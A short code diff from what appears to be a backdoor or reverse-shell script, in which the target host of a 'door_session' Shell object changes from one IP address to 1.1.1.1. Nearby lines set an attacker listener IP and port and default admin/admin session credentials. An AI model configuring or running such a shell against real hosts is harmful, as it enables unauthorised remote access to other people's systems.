@@ -90,7 +90,7 @@ if __name__ == "__main__":
     door_session = Shell(
             lhost = "58.94.136.200",    # your ip address
             lport = 8080 ,           # your opne port
-            rhost = "217.8.94.32",    # target host 
+            rhost = "1.1.1.1",    # target host 
             rport = 41444,          # target setting port 
             session_pass= "admin",  # target door session password
             session_user = "admin",  # target door session user 
